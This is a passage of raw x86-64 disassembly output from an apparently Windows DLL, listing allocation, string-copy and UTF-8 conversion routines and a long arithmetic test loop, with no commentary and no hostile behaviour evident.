    69687067:	48 89 d9             	mov    %rbx,%rcx
    6968706a:	e8 ff fe ff ff       	call   0x69686f6e
    6968706f:	48 8b 43 18          	mov    0x18(%rbx),%rax
    69687073:	ba f4 01 00 00       	mov    $0x1f4,%edx
    69687078:	48 01 c0             	add    %rax,%rax
    6968707b:	48 3d f4 01 00 00    	cmp    $0x1f4,%rax
    69687081:	48 0f 4c c2          	cmovl  %rdx,%rax
    69687085:	48 89 43 10          	mov    %rax,0x10(%rbx)
    69687089:	48 83 c4 20          	add    $0x20,%rsp
    6968708d:	5b                   	pop    %rbx
    6968708e:	c3                   	ret
    6968708f:	56                   	push   %rsi
    69687090:	53                   	push   %rbx
    69687091:	48 83 ec 28          	sub    $0x28,%rsp
    69687095:	48 89 d3             	mov    %rdx,%rbx
    69687098:	48 89 ce             	mov    %rcx,%rsi
    6968709b:	48 8d 0d 5e a9 0f 00 	lea    0xfa95e(%rip),%rcx        # 0x69781a00
    696870a2:	e8 9a ff ff ff       	call   0x69687041
    696870a7:	48 8d 53 10          	lea    0x10(%rbx),%rdx
    696870ab:	48 8d 0d b6 a9 0f 00 	lea    0xfa9b6(%rip),%rcx        # 0x69781a68
    696870b2:	e8 90 ef ff ff       	call   0x69686047
    696870b7:	48 89 da             	mov    %rbx,%rdx
    696870ba:	4c 8d 48 10          	lea    0x10(%rax),%r9
    696870be:	48 89 70 08          	mov    %rsi,0x8(%rax)
    696870c2:	48 c7 00 08 00 00 00 	movq   $0x8,(%rax)
    696870c9:	4c 89 c9             	mov    %r9,%rcx
    696870cc:	e8 fb a8 ff ff       	call   0x696819cc
    696870d1:	4c 89 c8             	mov    %r9,%rax
    696870d4:	48 83 c4 28          	add    $0x28,%rsp
    696870d8:	5b                   	pop    %rbx
    696870d9:	5e                   	pop    %rsi
    696870da:	c3                   	ret
    696870db:	57                   	push   %rdi
    696870dc:	56                   	push   %rsi
    696870dd:	53                   	push   %rbx
    696870de:	48 83 ec 20          	sub    $0x20,%rsp
    696870e2:	48 85 c9             	test   %rcx,%rcx
    696870e5:	48 89 ce             	mov    %rcx,%rsi
    696870e8:	74 51                	je     0x6968713b
    696870ea:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
    696870ef:	78 45                	js     0x69687136
    696870f1:	48 8b 19             	mov    (%rcx),%rbx
    696870f4:	48 8d 0d 45 5f 00 00 	lea    0x5f45(%rip),%rcx        # 0x6968d040
    696870fb:	b8 07 00 00 00       	mov    $0x7,%eax
    69687100:	48 83 fb 07          	cmp    $0x7,%rbx
    69687104:	48 0f 4c d8          	cmovl  %rax,%rbx
    69687108:	48 83 c6 10          	add    $0x10,%rsi
    6968710c:	48 8d 53 11          	lea    0x11(%rbx),%rdx
    69687110:	e8 7a ff ff ff       	call   0x6968708f
    69687115:	48 8b 56 f0          	mov    -0x10(%rsi),%rdx
    69687119:	48 89 58 08          	mov    %rbx,0x8(%rax)
    6968711d:	48 89 10             	mov    %rdx,(%rax)
    69687120:	48 8b 7e f0          	mov    -0x10(%rsi),%rdi
    69687124:	48 8d 50 10          	lea    0x10(%rax),%rdx
    69687128:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
    6968712c:	48 89 d7             	mov    %rdx,%rdi
    6968712f:	f3 a4                	rep movsb (%rsi),(%rdi)
    69687131:	48 89 c6             	mov    %rax,%rsi
    69687134:	eb 05                	jmp    0x6968713b
    69687136:	48 83 41 f0 08       	addq   $0x8,-0x10(%rcx)
    6968713b:	48 89 f0             	mov    %rsi,%rax
    6968713e:	48 83 c4 20          	add    $0x20,%rsp
    69687142:	5b                   	pop    %rbx
    69687143:	5e                   	pop    %rsi
    69687144:	5f                   	pop    %rdi
    69687145:	c3                   	ret
    69687146:	57                   	push   %rdi
    69687147:	56                   	push   %rsi
    69687148:	53                   	push   %rbx
    69687149:	48 83 ec 20          	sub    $0x20,%rsp
    6968714d:	4c 89 c6             	mov    %r8,%rsi
    69687150:	48 89 d3             	mov    %rdx,%rbx
    69687153:	48 89 cf             	mov    %rcx,%rdi
    69687156:	4c 89 c1             	mov    %r8,%rcx
    69687159:	e8 e3 fe ff ff       	call   0x69687041
    6968715e:	48 8d 53 10          	lea    0x10(%rbx),%rdx
    69687162:	48 8d 4e 68          	lea    0x68(%rsi),%rcx
    69687166:	e8 dc ee ff ff       	call   0x69686047
    6968716b:	48 8b 56 28          	mov    0x28(%rsi),%rdx
    6968716f:	48 89 c3             	mov    %rax,%rbx
    69687172:	48 89 78 08          	mov    %rdi,0x8(%rax)
    69687176:	48 c7 00 04 00 00 00 	movq   $0x4,(%rax)
    6968717d:	48 8b 46 18          	mov    0x18(%rsi),%rax
    69687181:	48 83 f8 08          	cmp    $0x8,%rax
    69687185:	7f 10                	jg     0x69687197
    69687187:	48 89 1c c2          	mov    %rbx,(%rdx,%rax,8)
    6968718b:	48 ff c0             	inc    %rax
    6968718e:	48 89 46 18          	mov    %rax,0x18(%rsi)
    69687192:	e9 b4 00 00 00       	jmp    0x6968724b
    69687197:	48 c1 e0 03          	shl    $0x3,%rax
    6968719b:	4c 8d 44 02 f8       	lea    -0x8(%rdx,%rax,1),%r8
    696871a0:	4d 8b 08             	mov    (%r8),%r9
    696871a3:	49 8b 09             	mov    (%r9),%rcx
    696871a6:	48 83 f9 07          	cmp    $0x7,%rcx
    696871aa:	0f 87 85 00 00 00    	ja     0x69687235
    696871b0:	4c 8d 44 02 f0       	lea    -0x10(%rdx,%rax,1),%r8
    696871b5:	4d 8b 08             	mov    (%r8),%r9
    696871b8:	49 8b 09             	mov    (%r9),%rcx
    696871bb:	48 83 f9 07          	cmp    $0x7,%rcx
    696871bf:	77 74                	ja     0x69687235
    696871c1:	4c 8d 44 02 e8       	lea    -0x18(%rdx,%rax,1),%r8
    696871c6:	4d 8b 08             	mov    (%r8),%r9
    696871c9:	49 8b 09             	mov    (%r9),%rcx
    696871cc:	48 83 f9 07          	cmp    $0x7,%rcx
    696871d0:	77 63                	ja     0x69687235
    696871d2:	4c 8d 44 02 e0       	lea    -0x20(%rdx,%rax,1),%r8
    696871d7:	4d 8b 08             	mov    (%r8),%r9
    696871da:	49 8b 09             	mov    (%r9),%rcx
    696871dd:	48 83 f9 07          	cmp    $0x7,%rcx
    696871e1:	77 52                	ja     0x69687235
    696871e3:	4c 8d 44 02 d8       	lea    -0x28(%rdx,%rax,1),%r8
    696871e8:	4d 8b 08             	mov    (%r8),%r9
    696871eb:	49 8b 09             	mov    (%r9),%rcx
    696871ee:	48 83 f9 07          	cmp    $0x7,%rcx
    696871f2:	77 41                	ja     0x69687235
    696871f4:	4c 8d 44 02 d0       	lea    -0x30(%rdx,%rax,1),%r8
    696871f9:	4d 8b 08             	mov    (%r8),%r9
    696871fc:	49 8b 09             	mov    (%r9),%rcx
    696871ff:	48 83 f9 07          	cmp    $0x7,%rcx
    69687203:	77 30                	ja     0x69687235
    69687205:	4c 8d 44 02 c8       	lea    -0x38(%rdx,%rax,1),%r8
    6968720a:	4d 8b 08             	mov    (%r8),%r9
    6968720d:	49 8b 09             	mov    (%r9),%rcx
    69687210:	48 83 f9 07          	cmp    $0x7,%rcx
    69687214:	77 1f                	ja     0x69687235
    69687216:	48 8d 54 02 c0       	lea    -0x40(%rdx,%rax,1),%rdx
    6968721b:	48 8b 0a             	mov    (%rdx),%rcx
    6968721e:	48 8b 01             	mov    (%rcx),%rax
    69687221:	48 83 f8 07          	cmp    $0x7,%rax
    69687225:	77 1a                	ja     0x69687241
    69687227:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
    6968722b:	48 89 da             	mov    %rbx,%rdx
    6968722e:	e8 a4 ef ff ff       	call   0x696861d7
    69687233:	eb 16                	jmp    0x6968724b
    69687235:	48 83 e1 fb          	and    $0xfffffffffffffffb,%rcx
    69687239:	49 89 09             	mov    %rcx,(%r9)
    6968723c:	49 89 18             	mov    %rbx,(%r8)
    6968723f:	eb 0a                	jmp    0x6968724b
    69687241:	48 83 e0 fb          	and    $0xfffffffffffffffb,%rax
    69687245:	48 89 01             	mov    %rax,(%rcx)
    69687248:	48 89 1a             	mov    %rbx,(%rdx)
    6968724b:	48 8d 43 10          	lea    0x10(%rbx),%rax
    6968724f:	48 83 c4 20          	add    $0x20,%rsp
    69687253:	5b                   	pop    %rbx
    69687254:	5e                   	pop    %rsi
    69687255:	5f                   	pop    %rdi
    69687256:	c3                   	ret
    69687257:	53                   	push   %rbx
    69687258:	48 83 ec 30          	sub    $0x30,%rsp
    6968725c:	4c 8d 05 9d a7 0f 00 	lea    0xfa79d(%rip),%r8        # 0x69781a00
    69687263:	48 89 d3             	mov    %rdx,%rbx
    69687266:	e8 db fe ff ff       	call   0x69687146
    6968726b:	48 89 da             	mov    %rbx,%rdx
    6968726e:	48 89 c1             	mov    %rax,%rcx
    69687271:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    69687276:	e8 51 a7 ff ff       	call   0x696819cc
    6968727b:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    69687280:	48 83 c4 30          	add    $0x30,%rsp
    69687284:	5b                   	pop    %rbx
    69687285:	c3                   	ret
    69687286:	41 57                	push   %r15
    69687288:	41 56                	push   %r14
    6968728a:	41 55                	push   %r13
    6968728c:	41 54                	push   %r12
    6968728e:	55                   	push   %rbp
    6968728f:	57                   	push   %rdi
    69687290:	56                   	push   %rsi
    69687291:	53                   	push   %rbx
    69687292:	48 83 ec 58          	sub    $0x58,%rsp
    69687296:	bf 01 00 00 00       	mov    $0x1,%edi
    6968729b:	bb 05 00 00 00       	mov    $0x5,%ebx
    696872a0:	e8 34 b3 ff ff       	call   0x696825d9
    696872a5:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
    696872aa:	ba 08 00 00 00       	mov    $0x8,%edx
    696872af:	48 8d 6c 24 48       	lea    0x48(%rsp),%rbp
    696872b4:	48 89 f1             	mov    %rsi,%rcx
    696872b7:	e8 10 a7 ff ff       	call   0x696819cc
    696872bc:	ba 08 00 00 00       	mov    $0x8,%edx
    696872c1:	48 89 f1             	mov    %rsi,%rcx
    696872c4:	e8 03 a7 ff ff       	call   0x696819cc
    696872c9:	4c 8d 64 24 30       	lea    0x30(%rsp),%r12
    696872ce:	4c 8d 6c 24 40       	lea    0x40(%rsp),%r13
    696872d3:	6b db 39             	imul   $0x39,%ebx,%ebx
    696872d6:	48 89 f8             	mov    %rdi,%rax
    696872d9:	b9 03 00 00 00       	mov    $0x3,%ecx
    696872de:	4c 8d 74 24 38       	lea    0x38(%rsp),%r14
    696872e3:	48 99                	cqto
    696872e5:	48 f7 f9             	idiv   %rcx
    696872e8:	49 89 d0             	mov    %rdx,%r8
    696872eb:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    696872f0:	8d 43 2b             	lea    0x2b(%rbx),%eax
    696872f3:	bb 17 27 00 00       	mov    $0x2717,%ebx
    696872f8:	99                   	cltd
    696872f9:	f7 fb                	idiv   %ebx
    696872fb:	49 83 f8 01          	cmp    $0x1,%r8
    696872ff:	44 8d 7a 01          	lea    0x1(%rdx),%r15d
    69687303:	89 d3                	mov    %edx,%ebx
    69687305:	0f 84 9f 00 00 00    	je     0x696873aa
    6968730b:	49 83 f8 02          	cmp    $0x2,%r8
    6968730f:	0f 84 e9 00 00 00    	je     0x696873fe
    69687315:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
    6968731c:	00 00 
    6968731e:	41 89 d1             	mov    %edx,%r9d
    69687321:	49 89 e8             	mov    %rbp,%r8
    69687324:	4c 89 e2             	mov    %r12,%rdx
    69687327:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
    6968732e:	00 00 
    69687330:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
    69687337:	00 00 
    69687339:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
    69687340:	00 00 
    69687342:	e8 76 f1 ff ff       	call   0x696864bd
    69687347:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
    6968734c:	45 89 f9             	mov    %r15d,%r9d
    6968734f:	4d 89 e8             	mov    %r13,%r8
    69687352:	4c 89 f2             	mov    %r14,%rdx
    69687355:	e8 63 f1 ff ff       	call   0x696864bd
    6968735a:	48 83 7c 24 38 00    	cmpq   $0x0,0x38(%rsp)
    69687360:	75 29                	jne    0x6968738b
    69687362:	48 8d 0d d7 55 10 00 	lea    0x1055d7(%rip),%rcx        # 0x6978c940
    69687369:	ba 18 00 00 00       	mov    $0x18,%edx
    6968736e:	e8 e4 fe ff ff       	call   0x69687257
    69687373:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
    69687378:	89 18                	mov    %ebx,(%rax)
    6968737a:	49 89 c6             	mov    %rax,%r14
    6968737d:	e8 6c b0 ff ff       	call   0x696823ee
    69687382:	41 89 46 04          	mov    %eax,0x4(%r14)
    69687386:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
    6968738b:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
    69687390:	49 89 f0             	mov    %rsi,%r8
    69687393:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
    69687398:	e8 c6 f0 ff ff       	call   0x69686463
    6968739d:	49 89 f0             	mov    %rsi,%r8
    696873a0:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
    696873a5:	e9 b3 00 00 00       	jmp    0x6968745d
    696873aa:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
    696873b1:	00 00 
    696873b3:	41 89 d1             	mov    %edx,%r9d
    696873b6:	4d 89 e0             	mov    %r12,%r8
    696873b9:	48 89 ea             	mov    %rbp,%rdx
    696873bc:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
    696873c3:	00 00 
    696873c5:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
    696873cc:	00 00 
    696873ce:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
    696873d5:	00 00 
    696873d7:	e8 e1 f0 ff ff       	call   0x696864bd
    696873dc:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
    696873e1:	4d 89 f0             	mov    %r14,%r8
    696873e4:	4c 89 ea             	mov    %r13,%rdx
    696873e7:	45 89 f9             	mov    %r15d,%r9d
    696873ea:	e8 ce f0 ff ff       	call   0x696864bd
    696873ef:	49 89 f0             	mov    %rsi,%r8
    696873f2:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
    696873f7:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
    696873fc:	eb 64                	jmp    0x69687462
    696873fe:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
    69687405:	00 00 
    69687407:	41 89 d1             	mov    %edx,%r9d
    6968740a:	4d 89 e0             	mov    %r12,%r8
    6968740d:	48 89 ea             	mov    %rbp,%rdx
    69687410:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
    69687417:	00 00 
    69687419:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
    69687420:	00 00 
    69687422:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
    69687429:	00 00 
    6968742b:	e8 8d f0 ff ff       	call   0x696864bd
    69687430:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
    69687435:	45 89 f9             	mov    %r15d,%r9d
    69687438:	4d 89 f0             	mov    %r14,%r8
    6968743b:	4c 89 ea             	mov    %r13,%rdx
    6968743e:	e8 7a f0 ff ff       	call   0x696864bd
    69687443:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
    69687448:	49 89 f0             	mov    %rsi,%r8
    6968744b:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
    69687450:	e8 0e f0 ff ff       	call   0x69686463
    69687455:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
    6968745a:	49 89 f0             	mov    %rsi,%r8
    6968745d:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    69687462:	e8 fc ef ff ff       	call   0x69686463
    69687467:	48 ff c7             	inc    %rdi
    6968746a:	48 81 ff 20 a1 07 00 	cmp    $0x7a120,%rdi
    69687471:	0f 85 5c fe ff ff    	jne    0x696872d3
    69687477:	48 83 c4 58          	add    $0x58,%rsp
    6968747b:	5b                   	pop    %rbx
    6968747c:	5e                   	pop    %rsi
    6968747d:	5f                   	pop    %rdi
    6968747e:	5d                   	pop    %rbp
    6968747f:	41 5c                	pop    %r12
    69687481:	41 5d                	pop    %r13
    69687483:	41 5e                	pop    %r14
    69687485:	41 5f                	pop    %r15
    69687487:	c3                   	ret
    69687488:	55                   	push   %rbp
    69687489:	57                   	push   %rdi
    6968748a:	56                   	push   %rsi
    6968748b:	53                   	push   %rbx
    6968748c:	48 83 ec 68          	sub    $0x68,%rsp
    69687490:	0f 29 7c 24 50       	movaps %xmm7,0x50(%rsp)
    69687495:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
    6968749a:	48 89 cd             	mov    %rcx,%rbp
    6968749d:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
    696874a2:	48 89 d9             	mov    %rbx,%rcx
    696874a5:	e8 cd b8 ff ff       	call   0x69682d77
    696874aa:	0f 10 7c 24 40       	movups 0x40(%rsp),%xmm7
    696874af:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
    696874b4:	e8 cd fd ff ff       	call   0x69687286
    696874b9:	48 89 d9             	mov    %rbx,%rcx
    696874bc:	e8 b6 b8 ff ff       	call   0x69682d77
    696874c1:	0f 10 44 24 40       	movups 0x40(%rsp),%xmm0
    696874c6:	0f 29 7c 24 20       	movaps %xmm7,0x20(%rsp)
    696874cb:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
    696874d0:	49 89 f8             	mov    %rdi,%r8
    696874d3:	48 89 f2             	mov    %rsi,%rdx
    696874d6:	48 89 d9             	mov    %rbx,%rcx
    696874d9:	e8 57 b7 ff ff       	call   0x69682c35
    696874de:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
    696874e3:	48 89 d9             	mov    %rbx,%rcx
    696874e6:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
    696874eb:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
    696874f0:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
    696874f5:	e8 c3 b6 ff ff       	call   0x69682bbd
    696874fa:	48 39 e8             	cmp    %rbp,%rax
    696874fd:	7d 1e                	jge    0x6968751d
    696874ff:	e8 82 fd ff ff       	call   0x69687286
    69687504:	48 89 d9             	mov    %rbx,%rcx
    69687507:	e8 6b b8 ff ff       	call   0x69682d77
    6968750c:	0f 10 4c 24 40       	movups 0x40(%rsp),%xmm1
    69687511:	0f 29 7c 24 20       	movaps %xmm7,0x20(%rsp)
    69687516:	0f 29 4c 24 30       	movaps %xmm1,0x30(%rsp)
    6968751b:	eb b3                	jmp    0x696874d0
    6968751d:	0f 28 7c 24 50       	movaps 0x50(%rsp),%xmm7
    69687522:	48 83 c4 68          	add    $0x68,%rsp
    69687526:	5b                   	pop    %rbx
    69687527:	5e                   	pop    %rsi
    69687528:	5f                   	pop    %rdi
    69687529:	5d                   	pop    %rbp
    6968752a:	c3                   	ret
    6968752b:	53                   	push   %rbx
    6968752c:	48 83 ec 20          	sub    $0x20,%rsp
    69687530:	bb 07 00 00 00       	mov    $0x7,%ebx
    69687535:	48 83 f9 07          	cmp    $0x7,%rcx
    69687539:	48 0f 4d d9          	cmovge %rcx,%rbx
    6968753d:	48 8d 0d fc 5a 00 00 	lea    0x5afc(%rip),%rcx        # 0x6968d040
    69687544:	48 8d 53 11          	lea    0x11(%rbx),%rdx
    69687548:	e8 0a fd ff ff       	call   0x69687257
    6968754d:	48 89 58 08          	mov    %rbx,0x8(%rax)
    69687551:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    69687558:	48 83 c4 20          	add    $0x20,%rsp
    6968755c:	5b                   	pop    %rbx
    6968755d:	c3                   	ret
    6968755e:	41 57                	push   %r15
    69687560:	41 56                	push   %r14
    69687562:	41 55                	push   %r13
    69687564:	41 54                	push   %r12
    69687566:	55                   	push   %rbp
    69687567:	57                   	push   %rdi
    69687568:	56                   	push   %rsi
    69687569:	53                   	push   %rbx
    6968756a:	48 83 ec 48          	sub    $0x48,%rsp
    6968756e:	49 89 d4             	mov    %rdx,%r12
    69687571:	49 89 cd             	mov    %rcx,%r13
    69687574:	ba 10 00 00 00       	mov    $0x10,%edx
    69687579:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
    6968757e:	e8 49 a4 ff ff       	call   0x696819cc
    69687583:	49 8b 44 24 10       	mov    0x10(%r12),%rax
    69687588:	31 c9                	xor    %ecx,%ecx
    6968758a:	48 85 c0             	test   %rax,%rax
    6968758d:	74 12                	je     0x696875a1
    6968758f:	48 8b 18             	mov    (%rax),%rbx
    69687592:	31 d2                	xor    %edx,%edx
    69687594:	48 83 c0 10          	add    $0x10,%rax
    69687598:	4c 8d 43 ff          	lea    -0x1(%rbx),%r8
    6968759c:	4c 39 c2             	cmp    %r8,%rdx
    6968759f:	7e 35                	jle    0x696875d6
    696875a1:	48 83 c1 02          	add    $0x2,%rcx
    696875a5:	31 ed                	xor    %ebp,%ebp
    696875a7:	e8 0c f0 ff ff       	call   0x696865b8
    696875ac:	49 89 c6             	mov    %rax,%r14
    696875af:	49 8b 44 24 10       	mov    0x10(%r12),%rax
    696875b4:	48 85 c0             	test   %rax,%rax
    696875b7:	0f 84 f5 00 00 00    	je     0x696876b2
    696875bd:	48 8b 28             	mov    (%rax),%rbp
    696875c0:	4c 8d 3d 79 78 00 00 	lea    0x7879(%rip),%r15        # 0x6968ee40
    696875c7:	31 db                	xor    %ebx,%ebx
    696875c9:	48 8d 45 ff          	lea    -0x1(%rbp),%rax
    696875cd:	31 ed                	xor    %ebp,%ebp
    696875cf:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    696875d4:	eb 46                	jmp    0x6968761c
    696875d6:	80 78 10 00          	cmpb   $0x0,0x10(%rax)
    696875da:	74 25                	je     0x69687601
    696875dc:	4c 8b 08             	mov    (%rax),%r9
    696875df:	45 31 d2             	xor    %r10d,%r10d
    696875e2:	4c 8b 58 08          	mov    0x8(%rax),%r11
    696875e6:	4d 85 c9             	test   %r9,%r9
    696875e9:	74 03                	je     0x696875ee
    696875eb:	4d 8b 11             	mov    (%r9),%r10
    696875ee:	45 31 c9             	xor    %r9d,%r9d
    696875f1:	4d 85 db             	test   %r11,%r11
    696875f4:	74 03                	je     0x696875f9
    696875f6:	4d 8b 0b             	mov    (%r11),%r9
    696875f9:	4f 8d 4c 0a 02       	lea    0x2(%r10,%r9,1),%r9
    696875fe:	4c 01 c9             	add    %r9,%rcx
    69687601:	48 ff c2             	inc    %rdx
    69687604:	48 83 c0 18          	add    $0x18,%rax
    69687608:	eb 92                	jmp    0x6968759c
    6968760a:	48 6b c3 18          	imul   $0x18,%rbx,%rax
    6968760e:	49 03 44 24 10       	add    0x10(%r12),%rax
    69687613:	80 78 20 00          	cmpb   $0x0,0x20(%rax)
    69687617:	75 0f                	jne    0x69687628
    69687619:	48 ff c3             	inc    %rbx
    6968761c:	48 3b 5c 24 28       	cmp    0x28(%rsp),%rbx
    69687621:	7e e7                	jle    0x6968760a
    69687623:	e9 8a 00 00 00       	jmp    0x696876b2
    69687628:	48 8b 78 10          	mov    0x10(%rax),%rdi
    6968762c:	31 d2                	xor    %edx,%edx
    6968762e:	48 8b 70 18          	mov    0x18(%rax),%rsi
    69687632:	48 85 ff             	test   %rdi,%rdi
    69687635:	74 03                	je     0x6968763a
    69687637:	48 8b 17             	mov    (%rdi),%rdx
    6968763a:	31 c0                	xor    %eax,%eax
    6968763c:	48 85 f6             	test   %rsi,%rsi
    6968763f:	74 03                	je     0x69687644
    69687641:	48 8b 06             	mov    (%rsi),%rax
    69687644:	48 8d 4c 02 01       	lea    0x1(%rdx,%rax,1),%rcx
    69687649:	e8 dd fe ff ff       	call   0x6968752b
    6968764e:	48 89 fa             	mov    %rdi,%rdx
    69687651:	48 89 c1             	mov    %rax,%rcx
    69687654:	49 89 c1             	mov    %rax,%r9
    69687657:	e8 42 a3 ff ff       	call   0x6968199e
    6968765c:	4c 89 fa             	mov    %r15,%rdx
    6968765f:	4c 89 c9             	mov    %r9,%rcx
    69687662:	e8 11 a3 ff ff       	call   0x69681978
    69687667:	48 89 f2             	mov    %rsi,%rdx
    6968766a:	4c 89 c9             	mov    %r9,%rcx
    6968766d:	e8 2c a3 ff ff       	call   0x6968199e
    69687672:	ba 01 00 00 00       	mov    $0x1,%edx
    69687677:	4d 85 c9             	test   %r9,%r9
    6968767a:	74 07                	je     0x69687683
    6968767c:	49 8b 01             	mov    (%r9),%rax
    6968767f:	48 8d 50 01          	lea    0x1(%rax),%rdx
    69687683:	4c 89 c9             	mov    %r9,%rcx
    69687686:	e8 73 a2 ff ff       	call   0x696818fe
    6968768b:	4d 8d 14 2e          	lea    (%r14,%rbp,1),%r10
    6968768f:	4d 85 c9             	test   %r9,%r9
    69687692:	48 89 c6             	mov    %rax,%rsi
    69687695:	4c 89 d7             	mov    %r10,%rdi
    69687698:	48 89 d1             	mov    %rdx,%rcx
    6968769b:	b8 01 00 00 00       	mov    $0x1,%eax
    696876a0:	f3 a4                	rep movsb (%rsi),(%rdi)
    696876a2:	74 06                	je     0x696876aa
    696876a4:	49 8b 01             	mov    (%r9),%rax
    696876a7:	48 ff c0             	inc    %rax
    696876aa:	48 01 c5             	add    %rax,%rbp
    696876ad:	e9 67 ff ff ff       	jmp    0x69687619
    696876b2:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
    696876b7:	4c 89 e8             	mov    %r13,%rax
    696876ba:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
    696876bf:	0f 28 44 24 30       	movaps 0x30(%rsp),%xmm0
    696876c4:	41 0f 11 45 00       	movups %xmm0,0x0(%r13)
    696876c9:	48 83 c4 48          	add    $0x48,%rsp
    696876cd:	5b                   	pop    %rbx
    696876ce:	5e                   	pop    %rsi
    696876cf:	5f                   	pop    %rdi
    696876d0:	5d                   	pop    %rbp
    696876d1:	41 5c                	pop    %r12
    696876d3:	41 5d                	pop    %r13
    696876d5:	41 5e                	pop    %r14
    696876d7:	41 5f                	pop    %r15
    696876d9:	c3                   	ret
    696876da:	53                   	push   %rbx
    696876db:	48 83 ec 20          	sub    $0x20,%rsp
    696876df:	48 89 cb             	mov    %rcx,%rbx
    696876e2:	e8 44 fe ff ff       	call   0x6968752b
    696876e7:	48 89 18             	mov    %rbx,(%rax)
    696876ea:	48 83 c4 20          	add    $0x20,%rsp
    696876ee:	5b                   	pop    %rbx
    696876ef:	c3                   	ret
    696876f0:	57                   	push   %rdi
    696876f1:	56                   	push   %rsi
    696876f2:	53                   	push   %rbx
    696876f3:	48 83 ec 20          	sub    $0x20,%rsp
    696876f7:	48 89 ce             	mov    %rcx,%rsi
    696876fa:	48 89 d1             	mov    %rdx,%rcx
    696876fd:	48 89 d3             	mov    %rdx,%rbx
    69687700:	e8 d5 ff ff ff       	call   0x696876da
    69687705:	48 89 d9             	mov    %rbx,%rcx
    69687708:	48 8d 50 10          	lea    0x10(%rax),%rdx
    6968770c:	48 89 d7             	mov    %rdx,%rdi
    6968770f:	f3 a4                	rep movsb (%rsi),(%rdi)
    69687711:	48 83 c4 20          	add    $0x20,%rsp
    69687715:	5b                   	pop    %rbx
    69687716:	5e                   	pop    %rsi
    69687717:	5f                   	pop    %rdi
    69687718:	c3                   	ret
    69687719:	48 ff c1             	inc    %rcx
    6968771c:	48 01 c9             	add    %rcx,%rcx
    6968771f:	eb b9                	jmp    0x696876da
    69687721:	55                   	push   %rbp
    69687722:	57                   	push   %rdi
    69687723:	56                   	push   %rsi
    69687724:	53                   	push   %rbx
    69687725:	48 83 ec 38          	sub    $0x38,%rsp
    69687729:	31 db                	xor    %ebx,%ebx
    6968772b:	48 85 c9             	test   %rcx,%rcx
    6968772e:	48 89 ce             	mov    %rcx,%rsi
    69687731:	48 89 d7             	mov    %rdx,%rdi
    69687734:	74 56                	je     0x6968778c
    69687736:	41 89 d1             	mov    %edx,%r9d
    69687739:	49 89 c8             	mov    %rcx,%r8
    6968773c:	31 d2                	xor    %edx,%edx
    6968773e:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
    69687745:	00 
    69687746:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
    6968774d:	00 00 
    6968774f:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
    69687754:	ff 15 36 d1 0f 00    	call   *0xfd136(%rip)        # 0x69784890
    6968775a:	48 63 c8             	movslq %eax,%rcx
    6968775d:	48 89 cd             	mov    %rcx,%rbp
    69687760:	e8 b4 ff ff ff       	call   0x69687719
    69687765:	48 89 c1             	mov    %rax,%rcx
    69687768:	48 89 c3             	mov    %rax,%rbx
    6968776b:	e8 8e a1 ff ff       	call   0x696818fe
    69687770:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
    69687774:	41 89 f9             	mov    %edi,%r9d
    69687777:	49 89 f0             	mov    %rsi,%r8
    6968777a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    6968777f:	31 d2                	xor    %edx,%edx
    69687781:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
    69687786:	ff 15 04 d1 0f 00    	call   *0xfd104(%rip)        # 0x69784890
    6968778c:	48 89 d8             	mov    %rbx,%rax
    6968778f:	48 83 c4 38          	add    $0x38,%rsp
    69687793:	5b                   	pop    %rbx
    69687794:	5e                   	pop    %rsi
    69687795:	5f                   	pop    %rdi
    69687796:	5d                   	pop    %rbp
    69687797:	c3                   	ret
    69687798:	48 83 ec 28          	sub    $0x28,%rsp
    6968779c:	e8 5d a1 ff ff       	call   0x696818fe
